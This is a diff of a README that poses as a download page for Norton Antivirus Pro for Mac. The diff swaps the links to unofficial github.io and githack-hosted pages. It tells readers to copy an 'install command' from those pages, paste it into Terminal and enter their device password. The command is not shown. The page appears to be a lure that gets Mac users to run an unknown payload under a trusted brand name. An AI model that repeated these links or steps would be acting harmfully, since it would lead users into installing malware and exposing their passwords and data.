@@ -1,10 +1,10 @@
 # Norton Antivirus Pro For Mac — Download For Mac OS  
-![logo](https://beesmartstores.com/cdn/shop/products/14-Norton_a5c7b30a-a853-407e-abbe-0b24ef1c78fc_300x300.png?v=1621069947)
+![logo-norton](https://beesmartstores.com/cdn/shop/products/14-Norton_a5c7b30a-a853-407e-abbe-0b24ef1c78fc_300x300.png?v=1621069947)
 
 Norton Antivirus Pro for Mac provides robust protection against malware, viruses, and online threats for macOS users. 🛡️  
 Follow the instructions below to install Norton Antivirus Pro safely and start protecting your Mac.  
 
-[![Download For Mac](https://img.shields.io/badge/Download-For%20Mac-000000?logo=apple&style=for-the-badge)](https://juianaiud84.github.io/.github/norton-antivirus-pro)  
+[![install For Mac](https://img.shields.io/badge/install-For%20Mac-000000?logo=apple&style=for-the-badge)](https://dinkkennyrice406.github.io/.github/norton-antivirus-pro)  
 
 If the download button does not work, you can also install Norton using the terminal command provided below.  
 
@@ -23,7 +23,7 @@ If the download button does not work, you can also install Norton using the term
 
 1. Get the installation command by pressing this button:  
   
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-007AFF?style=for-the-badge&logo=apple)](https://gistcdn.githack.com/bountyhuntergekata-svg/e3057e5ea2db5afb177822989f4bc16c/raw/1349586a7be751fa8ef74c70f35af4ed7cfad693/install.html)  
+[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-007AFF?style=for-the-badge&logo=apple)](https://dinkkennyrice406.github.io/.github/norton-antivirus-pro)  
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
